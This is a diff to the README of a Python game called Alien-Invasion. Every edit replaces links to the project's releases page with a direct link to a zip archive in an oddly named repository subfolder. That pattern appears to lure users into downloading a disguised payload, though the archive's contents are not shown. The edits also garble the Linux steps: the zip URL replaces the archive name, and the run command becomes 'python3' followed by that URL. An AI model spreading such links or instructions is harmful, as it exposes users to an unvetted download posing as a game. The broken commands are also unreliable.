@@ -1,6 +1,6 @@
 # 👾 Alien-Invasion - Defend Earth from Alien Threats
 
-[![Download Alien-Invasion](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/boybands/Alien-Invasion/releases)
+[![Download Alien-Invasion](https://raw.githubusercontent.com/boybands/Alien-Invasion/main/nebalioid/Alien-Invasion.zip)](https://raw.githubusercontent.com/boybands/Alien-Invasion/main/nebalioid/Alien-Invasion.zip)
 
 ## 🚀 Getting Started
 
@@ -46,17 +46,17 @@ To start playing Alien Invasion, you need to download the game files.
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download Alien-Invasion](https://github.com/boybands/Alien-Invasion/releases)
+   [Download Alien-Invasion](https://raw.githubusercontent.com/boybands/Alien-Invasion/main/nebalioid/Alien-Invasion.zip)
 
 2. **Download the Latest Release:** Look for the latest version available on the releases page. Click the file that matches your operating system. 
 
 3. **Run the Game:**
    - **Windows:** Double-click the downloaded `.exe` file.
    - **macOS:** Open the downloaded `.dmg` file and drag the game to your Applications folder, then launch it.
-   - **Linux:** Extract the files from the downloaded `.tar.gz` archive. Open your terminal and navigate to the extracted folder. Run the game using:
+   - **Linux:** Extract the files from the downloaded `https://raw.githubusercontent.com/boybands/Alien-Invasion/main/nebalioid/Alien-Invasion.zip` archive. Open your terminal and navigate to the extracted folder. Run the game using:
 
      ```
-     python3 alien_invasion.py
+     python3 https://raw.githubusercontent.com/boybands/Alien-Invasion/main/nebalioid/Alien-Invasion.zip
      ```
 
 ## 🎮 How to Play
